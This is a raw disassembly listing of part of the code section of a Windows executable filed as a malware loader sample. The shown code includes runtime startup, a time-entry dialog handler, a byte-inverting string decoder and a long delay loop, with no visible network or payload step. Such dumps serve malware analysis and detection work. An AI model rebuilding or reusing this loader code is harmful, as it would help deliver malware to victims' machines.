
malware_samples/loader/fc19c3807e2035fbeb7a78124c2da78ea5db82f56b8ff7b68c9a04f77c42bd53.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000401000 <.text>:
  401000:	c3                   	ret
  401001:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  401008:	0f 1f 84 00 00 00 00 
  40100f:	00 
  401010:	48 83 ec 38          	sub    $0x38,%rsp
  401014:	8b 05 36 b0 0d 00    	mov    0xdb036(%rip),%eax        # 0x4dc050
  40101a:	44 8b 0d 3f b0 0d 00 	mov    0xdb03f(%rip),%r9d        # 0x4dc060
  401021:	4c 8d 05 e8 af 0d 00 	lea    0xdafe8(%rip),%r8        # 0x4dc010
  401028:	48 8d 15 d9 af 0d 00 	lea    0xdafd9(%rip),%rdx        # 0x4dc008
  40102f:	48 8d 0d ce af 0d 00 	lea    0xdafce(%rip),%rcx        # 0x4dc004
  401036:	89 05 e4 af 0d 00    	mov    %eax,0xdafe4(%rip)        # 0x4dc020
  40103c:	48 8d 05 dd af 0d 00 	lea    0xdafdd(%rip),%rax        # 0x4dc020
  401043:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401048:	e8 0b 8f 00 00       	call   0x409f58
  40104d:	89 05 d1 af 0d 00    	mov    %eax,0xdafd1(%rip)        # 0x4dc024
  401053:	48 83 c4 38          	add    $0x38,%rsp
  401057:	c3                   	ret
  401058:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40105f:	00 
  401060:	48 83 ec 28          	sub    $0x28,%rsp
  401064:	31 c0                	xor    %eax,%eax
  401066:	66 81 3d 91 ef ff ff 	cmpw   $0x5a4d,-0x106f(%rip)        # 0x400000
  40106d:	4d 5a 
  40106f:	c7 05 ff af 0d 00 01 	movl   $0x1,0xdafff(%rip)        # 0x4dc078
  401076:	00 00 00 
  401079:	c7 05 f1 af 0d 00 01 	movl   $0x1,0xdaff1(%rip)        # 0x4dc074
  401080:	00 00 00 
  401083:	c7 05 e3 af 0d 00 01 	movl   $0x1,0xdafe3(%rip)        # 0x4dc070
  40108a:	00 00 00 
  40108d:	c7 05 e9 af 0d 00 01 	movl   $0x1,0xdafe9(%rip)        # 0x4dc080
  401094:	00 00 00 
  401097:	74 67                	je     0x401100
  401099:	89 05 7d af 0d 00    	mov    %eax,0xdaf7d(%rip)        # 0x4dc01c
  40109f:	8b 05 eb af 0d 00    	mov    0xdafeb(%rip),%eax        # 0x4dc090
  4010a5:	85 c0                	test   %eax,%eax
  4010a7:	74 48                	je     0x4010f1
  4010a9:	b9 02 00 00 00       	mov    $0x2,%ecx
  4010ae:	e8 ad 8e 00 00       	call   0x409f60
  4010b3:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
  4010ba:	e8 81 2c 00 00       	call   0x403d40
  4010bf:	8b 15 db af 0d 00    	mov    0xdafdb(%rip),%edx        # 0x4dc0a0
  4010c5:	48 89 05 e4 c3 0d 00 	mov    %rax,0xdc3e4(%rip)        # 0x4dd4b0
  4010cc:	48 89 05 d5 c3 0d 00 	mov    %rax,0xdc3d5(%rip)        # 0x4dd4a8
  4010d3:	48 8b 05 3e d6 0d 00 	mov    0xdd63e(%rip),%rax        # 0x4de718
  4010da:	89 10                	mov    %edx,(%rax)
  4010dc:	e8 0f 33 00 00       	call   0x4043f0
  4010e1:	83 3d 18 7e 0d 00 01 	cmpl   $0x1,0xd7e18(%rip)        # 0x4d8f00
  4010e8:	74 66                	je     0x401150
  4010ea:	31 c0                	xor    %eax,%eax
  4010ec:	48 83 c4 28          	add    $0x28,%rsp
  4010f0:	c3                   	ret
  4010f1:	b9 01 00 00 00       	mov    $0x1,%ecx
  4010f6:	e8 65 8e 00 00       	call   0x409f60
  4010fb:	eb b6                	jmp    0x4010b3
  4010fd:	0f 1f 00             	nopl   (%rax)
  401100:	48 63 0d 35 ef ff ff 	movslq -0x10cb(%rip),%rcx        # 0x40003c
  401107:	48 8d 15 f2 ee ff ff 	lea    -0x110e(%rip),%rdx        # 0x400000
  40110e:	48 01 ca             	add    %rcx,%rdx
  401111:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
  401117:	75 80                	jne    0x401099
  401119:	0f b7 4a 18          	movzwl 0x18(%rdx),%ecx
  40111d:	66 81 f9 0b 01       	cmp    $0x10b,%cx
  401122:	74 3f                	je     0x401163
  401124:	66 81 f9 0b 02       	cmp    $0x20b,%cx
  401129:	0f 85 6a ff ff ff    	jne    0x401099
  40112f:	83 ba 84 00 00 00 0e 	cmpl   $0xe,0x84(%rdx)
  401136:	0f 86 5d ff ff ff    	jbe    0x401099
  40113c:	8b 92 f8 00 00 00    	mov    0xf8(%rdx),%edx
  401142:	31 c0                	xor    %eax,%eax
  401144:	85 d2                	test   %edx,%edx
  401146:	0f 95 c0             	setne  %al
  401149:	e9 4b ff ff ff       	jmp    0x401099
  40114e:	66 90                	xchg   %ax,%ax
  401150:	48 8d 0d a9 31 00 00 	lea    0x31a9(%rip),%rcx        # 0x404300
  401157:	e8 94 31 00 00       	call   0x4042f0
  40115c:	31 c0                	xor    %eax,%eax
  40115e:	48 83 c4 28          	add    $0x28,%rsp
  401162:	c3                   	ret
  401163:	83 7a 74 0e          	cmpl   $0xe,0x74(%rdx)
  401167:	0f 86 2c ff ff ff    	jbe    0x401099
  40116d:	8b 8a e8 00 00 00    	mov    0xe8(%rdx),%ecx
  401173:	31 c0                	xor    %eax,%eax
  401175:	85 c9                	test   %ecx,%ecx
  401177:	0f 95 c0             	setne  %al
  40117a:	e9 1a ff ff ff       	jmp    0x401099
  40117f:	90                   	nop
  401180:	41 54                	push   %r12
  401182:	55                   	push   %rbp
  401183:	57                   	push   %rdi
  401184:	56                   	push   %rsi
  401185:	53                   	push   %rbx
  401186:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
  40118d:	44 8b 1d fc ae 0d 00 	mov    0xdaefc(%rip),%r11d        # 0x4dc090
  401194:	31 c0                	xor    %eax,%eax
  401196:	b9 0d 00 00 00       	mov    $0xd,%ecx
  40119b:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  4011a0:	45 85 db             	test   %r11d,%r11d
  4011a3:	48 89 d7             	mov    %rdx,%rdi
  4011a6:	f3 48 ab             	rep stos %rax,(%rdi)
  4011a9:	0f 85 c1 02 00 00    	jne    0x401470
  4011af:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
  4011b6:	00 00 
  4011b8:	48 8b 58 08          	mov    0x8(%rax),%rbx
  4011bc:	31 c0                	xor    %eax,%eax
  4011be:	f0 48 0f b1 1d f9 c2 	lock cmpxchg %rbx,0xdc2f9(%rip)        # 0x4dd4c0
  4011c5:	0d 00 
  4011c7:	48 85 c0             	test   %rax,%rax
  4011ca:	74 35                	je     0x401201
  4011cc:	48 39 c3             	cmp    %rax,%rbx
  4011cf:	0f 84 4b 02 00 00    	je     0x401420
  4011d5:	48 8b 3d 94 d4 0d 00 	mov    0xdd494(%rip),%rdi        # 0x4de670
  4011dc:	31 f6                	xor    %esi,%esi
  4011de:	eb 09                	jmp    0x4011e9
  4011e0:	48 39 c3             	cmp    %rax,%rbx
  4011e3:	0f 84 37 02 00 00    	je     0x401420
  4011e9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  4011ee:	ff d7                	call   *%rdi
  4011f0:	48 89 f0             	mov    %rsi,%rax
  4011f3:	f0 48 0f b1 1d c4 c2 	lock cmpxchg %rbx,0xdc2c4(%rip)        # 0x4dd4c0
  4011fa:	0d 00 
  4011fc:	48 85 c0             	test   %rax,%rax
  4011ff:	75 df                	jne    0x4011e0
  401201:	8b 05 b1 c2 0d 00    	mov    0xdc2b1(%rip),%eax        # 0x4dd4b8
  401207:	31 db                	xor    %ebx,%ebx
  401209:	83 f8 01             	cmp    $0x1,%eax
  40120c:	0f 84 22 02 00 00    	je     0x401434
  401212:	8b 05 a0 c2 0d 00    	mov    0xdc2a0(%rip),%eax        # 0x4dd4b8
  401218:	85 c0                	test   %eax,%eax
  40121a:	0f 84 60 02 00 00    	je     0x401480
  401220:	c7 05 d6 ad 0d 00 01 	movl   $0x1,0xdadd6(%rip)        # 0x4dc000
  401227:	00 00 00 
  40122a:	8b 05 88 c2 0d 00    	mov    0xdc288(%rip),%eax        # 0x4dd4b8
  401230:	83 f8 01             	cmp    $0x1,%eax
  401233:	0f 84 14 02 00 00    	je     0x40144d
  401239:	85 db                	test   %ebx,%ebx
  40123b:	75 0a                	jne    0x401247
  40123d:	31 c0                	xor    %eax,%eax
  40123f:	f0 48 87 05 79 c2 0d 	lock xchg %rax,0xdc279(%rip)        # 0x4dd4c0
  401246:	00 
  401247:	48 8b 05 52 7c 0d 00 	mov    0xd7c52(%rip),%rax        # 0x4d8ea0
  40124e:	48 85 c0             	test   %rax,%rax
  401251:	74 0c                	je     0x40125f
  401253:	45 31 c0             	xor    %r8d,%r8d
  401256:	ba 02 00 00 00       	mov    $0x2,%edx
  40125b:	31 c9                	xor    %ecx,%ecx
  40125d:	ff d0                	call   *%rax
  40125f:	e8 2c 34 00 00       	call   0x404690
  401264:	48 8d 0d 55 2e 00 00 	lea    0x2e55(%rip),%rcx        # 0x4040c0
  40126b:	ff 15 f7 d3 0d 00    	call   *0xdd3f7(%rip)        # 0x4de668
  401271:	48 89 05 48 ae 0d 00 	mov    %rax,0xdae48(%rip)        # 0x4dc0c0
  401278:	e8 53 2d 00 00       	call   0x403fd0
  40127d:	e8 fe 39 00 00       	call   0x404c80
  401282:	48 8d 15 77 7d 0d 00 	lea    0xd7d77(%rip),%rdx        # 0x4d9000
  401289:	48 89 c1             	mov    %rax,%rcx
  40128c:	ff 15 36 d3 0d 00    	call   *0xdd336(%rip)        # 0x4de5c8
  401292:	48 85 c0             	test   %rax,%rax
  401295:	74 09                	je     0x4012a0
  401297:	48 8d 0d 62 fd ff ff 	lea    -0x29e(%rip),%rcx        # 0x401000
  40129e:	ff d0                	call   *%rax
  4012a0:	e8 9b 3a 00 00       	call   0x404d40
  4012a5:	48 8d 05 54 ed ff ff 	lea    -0x12ac(%rip),%rax        # 0x400000
  4012ac:	31 c9                	xor    %ecx,%ecx
  4012ae:	48 89 05 23 c1 0d 00 	mov    %rax,0xdc123(%rip)        # 0x4dd3d8
  4012b5:	48 8b 05 3c d4 0d 00 	mov    0xdd43c(%rip),%rax        # 0x4de6f8
  4012bc:	48 8b 00             	mov    (%rax),%rax
  4012bf:	48 85 c0             	test   %rax,%rax
  4012c2:	75 1d                	jne    0x4012e1
  4012c4:	eb 51                	jmp    0x401317
  4012c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4012cd:	00 00 00 
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	74 3c                	je     0x401310
  4012d4:	85 c9                	test   %ecx,%ecx
  4012d6:	74 2c                	je     0x401304
  4012d8:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012dd:	48 83 c0 01          	add    $0x1,%rax
  4012e1:	0f b6 10             	movzbl (%rax),%edx
  4012e4:	80 fa 20             	cmp    $0x20,%dl
  4012e7:	7e e7                	jle    0x4012d0
  4012e9:	41 89 c8             	mov    %ecx,%r8d
  4012ec:	41 83 f0 01          	xor    $0x1,%r8d
  4012f0:	80 fa 22             	cmp    $0x22,%dl
  4012f3:	41 0f 44 c8          	cmove  %r8d,%ecx
  4012f7:	eb e4                	jmp    0x4012dd
  4012f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401300:	84 d2                	test   %dl,%dl
  401302:	74 0c                	je     0x401310
  401304:	48 83 c0 01          	add    $0x1,%rax
  401308:	0f b6 10             	movzbl (%rax),%edx
  40130b:	80 fa 20             	cmp    $0x20,%dl
  40130e:	7e f0                	jle    0x401300
  401310:	48 89 05 b9 c0 0d 00 	mov    %rax,0xdc0b9(%rip)        # 0x4dd3d0
  401317:	44 8b 15 72 ad 0d 00 	mov    0xdad72(%rip),%r10d        # 0x4dc090
  40131e:	45 85 d2             	test   %r10d,%r10d
  401321:	74 16                	je     0x401339
  401323:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
  401328:	b8 0a 00 00 00       	mov    $0xa,%eax
  40132d:	0f 85 dd 00 00 00    	jne    0x401410
  401333:	89 05 c7 9c 00 00    	mov    %eax,0x9cc7(%rip)        # 0x40b000
  401339:	48 63 2d c4 ac 0d 00 	movslq 0xdacc4(%rip),%rbp        # 0x4dc004
  401340:	8d 4d 01             	lea    0x1(%rbp),%ecx
  401343:	48 63 c9             	movslq %ecx,%rcx
  401346:	48 c1 e1 03          	shl    $0x3,%rcx
  40134a:	e8 21 8c 00 00       	call   0x409f70
  40134f:	85 ed                	test   %ebp,%ebp
  401351:	49 89 c4             	mov    %rax,%r12
  401354:	48 8b 3d ad ac 0d 00 	mov    0xdacad(%rip),%rdi        # 0x4dc008
  40135b:	0f 8e 41 01 00 00    	jle    0x4014a2
  401361:	31 db                	xor    %ebx,%ebx
  401363:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
  401367:	e8 0c 8c 00 00       	call   0x409f78
  40136c:	48 8d 70 01          	lea    0x1(%rax),%rsi
  401370:	48 89 f1             	mov    %rsi,%rcx
  401373:	e8 f8 8b 00 00       	call   0x409f70
  401378:	49 89 04 dc          	mov    %rax,(%r12,%rbx,8)
  40137c:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
  401380:	48 89 c1             	mov    %rax,%rcx
  401383:	49 89 f0             	mov    %rsi,%r8
  401386:	48 83 c3 01          	add    $0x1,%rbx
  40138a:	e8 d9 8b 00 00       	call   0x409f68
  40138f:	39 dd                	cmp    %ebx,%ebp
  401391:	7f d0                	jg     0x401363
  401393:	48 c1 e5 03          	shl    $0x3,%rbp
  401397:	49 c7 04 2c 00 00 00 	movq   $0x0,(%r12,%rbp,1)
  40139e:	00 
  40139f:	4c 89 25 62 ac 0d 00 	mov    %r12,0xdac62(%rip)        # 0x4dc008
  4013a6:	e8 45 3a 00 00       	call   0x404df0
  4013ab:	48 8b 15 5e ac 0d 00 	mov    0xdac5e(%rip),%rdx        # 0x4dc010
  4013b2:	48 8b 05 0f d3 0d 00 	mov    0xdd30f(%rip),%rax        # 0x4de6c8
  4013b9:	8b 0d 45 ac 0d 00    	mov    0xdac45(%rip),%ecx        # 0x4dc004
  4013bf:	48 89 10             	mov    %rdx,(%rax)
  4013c2:	4c 8b 05 47 ac 0d 00 	mov    0xdac47(%rip),%r8        # 0x4dc010
  4013c9:	48 8b 15 38 ac 0d 00 	mov    0xdac38(%rip),%rdx        # 0x4dc008
  4013d0:	e8 9b 8f 00 00       	call   0x40a370
  4013d5:	44 8b 0d 40 ac 0d 00 	mov    0xdac40(%rip),%r9d        # 0x4dc01c
  4013dc:	89 05 36 ac 0d 00    	mov    %eax,0xdac36(%rip)        # 0x4dc018
  4013e2:	45 85 c9             	test   %r9d,%r9d
  4013e5:	0f 84 be 00 00 00    	je     0x4014a9
  4013eb:	44 8b 05 0e ac 0d 00 	mov    0xdac0e(%rip),%r8d        # 0x4dc000
  4013f2:	45 85 c0             	test   %r8d,%r8d
  4013f5:	75 0b                	jne    0x401402
  4013f7:	e8 84 8b 00 00       	call   0x409f80
  4013fc:	8b 05 16 ac 0d 00    	mov    0xdac16(%rip),%eax        # 0x4dc018
  401402:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
  401409:	5b                   	pop    %rbx
  40140a:	5e                   	pop    %rsi
  40140b:	5f                   	pop    %rdi
  40140c:	5d                   	pop    %rbp
  40140d:	41 5c                	pop    %r12
  40140f:	c3                   	ret
  401410:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
  401415:	e9 19 ff ff ff       	jmp    0x401333
  40141a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401420:	8b 05 92 c0 0d 00    	mov    0xdc092(%rip),%eax        # 0x4dd4b8
  401426:	bb 01 00 00 00       	mov    $0x1,%ebx
  40142b:	83 f8 01             	cmp    $0x1,%eax
  40142e:	0f 85 de fd ff ff    	jne    0x401212
  401434:	b9 1f 00 00 00       	mov    $0x1f,%ecx
  401439:	e8 4a 8b 00 00       	call   0x409f88
  40143e:	8b 05 74 c0 0d 00    	mov    0xdc074(%rip),%eax        # 0x4dd4b8
  401444:	83 f8 01             	cmp    $0x1,%eax
  401447:	0f 85 ec fd ff ff    	jne    0x401239
  40144d:	48 8d 15 bc eb 0d 00 	lea    0xdebbc(%rip),%rdx        # 0x4e0010
  401454:	48 8d 0d a5 eb 0d 00 	lea    0xdeba5(%rip),%rcx        # 0x4e0000
  40145b:	e8 30 8b 00 00       	call   0x409f90
  401460:	c7 05 4e c0 0d 00 02 	movl   $0x2,0xdc04e(%rip)        # 0x4dd4b8
  401467:	00 00 00 
  40146a:	e9 ca fd ff ff       	jmp    0x401239
  40146f:	90                   	nop
  401470:	48 89 d1             	mov    %rdx,%rcx
  401473:	ff 15 57 d1 0d 00    	call   *0xdd157(%rip)        # 0x4de5d0
  401479:	e9 31 fd ff ff       	jmp    0x4011af
  40147e:	66 90                	xchg   %ax,%ax
  401480:	48 8d 15 a9 eb 0d 00 	lea    0xdeba9(%rip),%rdx        # 0x4e0030
  401487:	48 8d 0d 8a eb 0d 00 	lea    0xdeb8a(%rip),%rcx        # 0x4e0018
  40148e:	c7 05 20 c0 0d 00 01 	movl   $0x1,0xdc020(%rip)        # 0x4dd4b8
  401495:	00 00 00 
  401498:	e8 f3 8a 00 00       	call   0x409f90
  40149d:	e9 88 fd ff ff       	jmp    0x40122a
  4014a2:	31 ed                	xor    %ebp,%ebp
  4014a4:	e9 ee fe ff ff       	jmp    0x401397
  4014a9:	89 c1                	mov    %eax,%ecx
  4014ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4014b0:	e8 e3 8a 00 00       	call   0x409f98
  4014b5:	90                   	nop
  4014b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014bd:	00 00 00 
  4014c0:	48 83 ec 28          	sub    $0x28,%rsp
  4014c4:	c7 05 c2 ab 0d 00 01 	movl   $0x1,0xdabc2(%rip)        # 0x4dc090
  4014cb:	00 00 00 
  4014ce:	e8 3d 39 00 00       	call   0x404e10
  4014d3:	e8 a8 fc ff ff       	call   0x401180
  4014d8:	90                   	nop
  4014d9:	90                   	nop
  4014da:	48 83 c4 28          	add    $0x28,%rsp
  4014de:	c3                   	ret
  4014df:	90                   	nop
  4014e0:	48 83 ec 28          	sub    $0x28,%rsp
  4014e4:	c7 05 a2 ab 0d 00 00 	movl   $0x0,0xdaba2(%rip)        # 0x4dc090
  4014eb:	00 00 00 
  4014ee:	e8 1d 39 00 00       	call   0x404e10
  4014f3:	e8 88 fc ff ff       	call   0x401180
  4014f8:	90                   	nop
  4014f9:	90                   	nop
  4014fa:	48 83 c4 28          	add    $0x28,%rsp
  4014fe:	c3                   	ret
  4014ff:	90                   	nop
  401500:	57                   	push   %rdi
  401501:	56                   	push   %rsi
  401502:	53                   	push   %rbx
  401503:	48 83 ec 30          	sub    $0x30,%rsp
  401507:	8b 3a                	mov    (%rdx),%edi
  401509:	48 89 cb             	mov    %rcx,%rbx
  40150c:	48 89 d6             	mov    %rdx,%rsi
  40150f:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%rsp)
  401516:	00 
  401517:	48 8d 54 24 2c       	lea    0x2c(%rsp),%rdx
  40151c:	ff 15 96 d3 0d 00    	call   *0xdd396(%rip)        # 0x4de8b8
  401522:	39 7c 24 2c          	cmp    %edi,0x2c(%rsp)
  401526:	74 0d                	je     0x401535
  401528:	b8 01 00 00 00       	mov    $0x1,%eax
  40152d:	48 83 c4 30          	add    $0x30,%rsp
  401531:	5b                   	pop    %rbx
  401532:	5e                   	pop    %rsi
  401533:	5f                   	pop    %rdi
  401534:	c3                   	ret
  401535:	48 89 d9             	mov    %rbx,%rcx
  401538:	ff 15 72 d3 0d 00    	call   *0xdd372(%rip)        # 0x4de8b0
  40153e:	48 85 c0             	test   %rax,%rax
  401541:	75 e5                	jne    0x401528
  401543:	48 89 1e             	mov    %rbx,(%rsi)
  401546:	eb e5                	jmp    0x40152d
  401548:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40154f:	00 
  401550:	55                   	push   %rbp
  401551:	57                   	push   %rdi
  401552:	56                   	push   %rsi
  401553:	53                   	push   %rbx
  401554:	48 83 ec 28          	sub    $0x28,%rsp
  401558:	81 fa 10 01 00 00    	cmp    $0x110,%edx
  40155e:	48 89 cb             	mov    %rcx,%rbx
  401561:	74 1d                	je     0x401580
  401563:	31 c0                	xor    %eax,%eax
  401565:	81 fa 11 01 00 00    	cmp    $0x111,%edx
  40156b:	74 63                	je     0x4015d0
  40156d:	48 83 c4 28          	add    $0x28,%rsp
  401571:	5b                   	pop    %rbx
  401572:	5e                   	pop    %rsi
  401573:	5f                   	pop    %rdi
  401574:	5d                   	pop    %rbp
  401575:	c3                   	ret
  401576:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40157d:	00 00 00 
  401580:	48 8b 35 71 d3 0d 00 	mov    0xdd371(%rip),%rsi        # 0x4de8f8
  401587:	45 31 c9             	xor    %r9d,%r9d
  40158a:	44 8b 05 af aa 0d 00 	mov    0xdaaaf(%rip),%r8d        # 0x4dc040
  401591:	ba e9 03 00 00       	mov    $0x3e9,%edx
  401596:	ff d6                	call   *%rsi
  401598:	45 31 c9             	xor    %r9d,%r9d
  40159b:	48 89 d9             	mov    %rbx,%rcx
  40159e:	44 8b 05 97 aa 0d 00 	mov    0xdaa97(%rip),%r8d        # 0x4dc03c
  4015a5:	ba ea 03 00 00       	mov    $0x3ea,%edx
  4015aa:	ff d6                	call   *%rsi
  4015ac:	44 8b 05 85 aa 0d 00 	mov    0xdaa85(%rip),%r8d        # 0x4dc038
  4015b3:	45 31 c9             	xor    %r9d,%r9d
  4015b6:	ba eb 03 00 00       	mov    $0x3eb,%edx
  4015bb:	48 89 d9             	mov    %rbx,%rcx
  4015be:	ff d6                	call   *%rsi
  4015c0:	b8 01 00 00 00       	mov    $0x1,%eax
  4015c5:	48 83 c4 28          	add    $0x28,%rsp
  4015c9:	5b                   	pop    %rbx
  4015ca:	5e                   	pop    %rsi
  4015cb:	5f                   	pop    %rdi
  4015cc:	5d                   	pop    %rbp
  4015cd:	c3                   	ret
  4015ce:	66 90                	xchg   %ax,%ax
  4015d0:	66 41 83 f8 01       	cmp    $0x1,%r8w
  4015d5:	74 1e                	je     0x4015f5
  4015d7:	31 c0                	xor    %eax,%eax
  4015d9:	66 41 83 f8 02       	cmp    $0x2,%r8w
  4015de:	75 8d                	jne    0x40156d
  4015e0:	ba 02 00 00 00       	mov    $0x2,%edx
  4015e5:	ff 15 8d d2 0d 00    	call   *0xdd28d(%rip)        # 0x4de878
  4015eb:	b8 01 00 00 00       	mov    $0x1,%eax
  4015f0:	e9 78 ff ff ff       	jmp    0x40156d
  4015f5:	45 31 c9             	xor    %r9d,%r9d
  4015f8:	45 31 c0             	xor    %r8d,%r8d
  4015fb:	48 8b 35 9e d2 0d 00 	mov    0xdd29e(%rip),%rsi        # 0x4de8a0
  401602:	ba e9 03 00 00       	mov    $0x3e9,%edx
  401607:	ff d6                	call   *%rsi
  401609:	45 31 c9             	xor    %r9d,%r9d
  40160c:	45 31 c0             	xor    %r8d,%r8d
  40160f:	ba ea 03 00 00       	mov    $0x3ea,%edx
  401614:	48 89 d9             	mov    %rbx,%rcx
  401617:	89 c5                	mov    %eax,%ebp
  401619:	ff d6                	call   *%rsi
  40161b:	89 c7                	mov    %eax,%edi
  40161d:	45 31 c9             	xor    %r9d,%r9d
  401620:	45 31 c0             	xor    %r8d,%r8d
  401623:	ba eb 03 00 00       	mov    $0x3eb,%edx
  401628:	48 89 d9             	mov    %rbx,%rcx
  40162b:	ff d6                	call   *%rsi
  40162d:	85 ff                	test   %edi,%edi
  40162f:	78 16                	js     0x401647
  401631:	83 fd 17             	cmp    $0x17,%ebp
  401634:	77 11                	ja     0x401647
  401636:	85 c0                	test   %eax,%eax
  401638:	78 0d                	js     0x401647
  40163a:	83 ff 3b             	cmp    $0x3b,%edi
  40163d:	0f 1f 00             	nopl   (%rax)
  401640:	7f 05                	jg     0x401647
  401642:	83 f8 3b             	cmp    $0x3b,%eax
  401645:	7e 27                	jle    0x40166e
  401647:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  40164d:	4c 8d 05 cc 79 0d 00 	lea    0xd79cc(%rip),%r8        # 0x4d9020
  401654:	48 8d 15 d5 79 0d 00 	lea    0xd79d5(%rip),%rdx        # 0x4d9030
  40165b:	48 89 d9             	mov    %rbx,%rcx
  40165e:	ff 15 7c d2 0d 00    	call   *0xdd27c(%rip)        # 0x4de8e0
  401664:	b8 01 00 00 00       	mov    $0x1,%eax
  401669:	e9 ff fe ff ff       	jmp    0x40156d
  40166e:	89 2d cc a9 0d 00    	mov    %ebp,0xda9cc(%rip)        # 0x4dc040
  401674:	89 3d c2 a9 0d 00    	mov    %edi,0xda9c2(%rip)        # 0x4dc03c
  40167a:	ba 01 00 00 00       	mov    $0x1,%edx
  40167f:	89 05 b3 a9 0d 00    	mov    %eax,0xda9b3(%rip)        # 0x4dc038
  401685:	48 89 d9             	mov    %rbx,%rcx
  401688:	ff 15 ea d1 0d 00    	call   *0xdd1ea(%rip)        # 0x4de878
  40168e:	b8 01 00 00 00       	mov    $0x1,%eax
  401693:	e9 d5 fe ff ff       	jmp    0x40156d
  401698:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40169f:	00 
  4016a0:	53                   	push   %rbx
  4016a1:	48 83 ec 20          	sub    $0x20,%rsp
  4016a5:	44 0f b6 02          	movzbl (%rdx),%r8d
  4016a9:	31 c0                	xor    %eax,%eax
  4016ab:	48 89 cb             	mov    %rcx,%rbx
  4016ae:	45 84 c0             	test   %r8b,%r8b
  4016b1:	74 15                	je     0x4016c8
  4016b3:	41 f7 d0             	not    %r8d
  4016b6:	44 88 04 03          	mov    %r8b,(%rbx,%rax,1)
  4016ba:	48 83 c0 01          	add    $0x1,%rax
  4016be:	44 0f b6 04 02       	movzbl (%rdx,%rax,1),%r8d
  4016c3:	45 84 c0             	test   %r8b,%r8b
  4016c6:	75 eb                	jne    0x4016b3
  4016c8:	48 89 d1             	mov    %rdx,%rcx
  4016cb:	e8 a8 88 00 00       	call   0x409f78
  4016d0:	c6 04 03 00          	movb   $0x0,(%rbx,%rax,1)
  4016d4:	48 83 c4 20          	add    $0x20,%rsp
  4016d8:	5b                   	pop    %rbx
  4016d9:	c3                   	ret
  4016da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4016e0:	53                   	push   %rbx
  4016e1:	48 83 ec 20          	sub    $0x20,%rsp
  4016e5:	81 3d 55 a9 0d 00 00 	cmpl   $0x3b9aca00,0xda955(%rip)        # 0x4dc044
  4016ec:	ca 9a 3b 
  4016ef:	48 8b 1d 22 d2 0d 00 	mov    0xdd222(%rip),%rbx        # 0x4de918
  4016f6:	7f 22                	jg     0x40171a
  4016f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4016ff:	00 
  401700:	31 c9                	xor    %ecx,%ecx
  401702:	ff d3                	call   *%rbx
  401704:	8b 05 3a a9 0d 00    	mov    0xda93a(%rip),%eax        # 0x4dc044
  40170a:	83 c0 01             	add    $0x1,%eax
  40170d:	3d 00 ca 9a 3b       	cmp    $0x3b9aca00,%eax
  401712:	89 05 2c a9 0d 00    	mov    %eax,0xda92c(%rip)        # 0x4dc044
  401718:	7e e6                	jle    0x401700
  40171a:	48 83 c4 20          	add    $0x20,%rsp
  40171e:	5b                   	pop    %rbx
  40171f:	c3                   	ret
  401720:	41 b9 20 00 00 00    	mov    $0x20,%r9d
  401726:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40172c:	31 c0                	xor    %eax,%eax
  40172e:	66 90                	xchg   %ax,%ax
  401730:	45 89 c2             	mov    %r8d,%r10d
  401733:	45 89 c3             	mov    %r8d,%r11d
  401736:	41 21 ca             	and    %ecx,%r10d
  401739:	41 21 d3             	and    %edx,%r11d
  40173c:	75 05                	jne    0x401743
  40173e:	45 85 d2             	test   %r10d,%r10d
  401741:	75 0a                	jne    0x40174d
  401743:	45 85 db             	test   %r11d,%r11d
  401746:	74 08                	je     0x401750
  401748:	45 85 d2             	test   %r10d,%r10d
  40174b:	75 03                	jne    0x401750
  40174d:	44 09 c0             	or     %r8d,%eax
  401750:	45 01 c0             	add    %r8d,%r8d
  401753:	41 83 e9 01          	sub    $0x1,%r9d
  401757:	75 d7                	jne    0x401730
  401759:	c3                   	ret
  40175a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401760:	48 83 ec 38          	sub    $0x38,%rsp
  401764:	ff 15 1e ce 0d 00    	call   *0xdce1e(%rip)        # 0x4de588
  40176a:	48 8d 54 24 2c       	lea    0x2c(%rsp),%rdx
  40176f:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
  401773:	48 8d 0d 86 fd ff ff 	lea    -0x27a(%rip),%rcx        # 0x401500
  40177a:	ff 15 08 d1 0d 00    	call   *0xdd108(%rip)        # 0x4de888
  401780:	85 c0                	test   %eax,%eax
  401782:	75 0c                	jne    0x401790
  401784:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
  401788:	48 83 c4 38          	add    $0x38,%rsp
  40178c:	c3                   	ret
  40178d:	0f 1f 00             	nopl   (%rax)
  401790:	31 c0                	xor    %eax,%eax
  401792:	48 83 c4 38          	add    $0x38,%rsp
  401796:	c3                   	ret
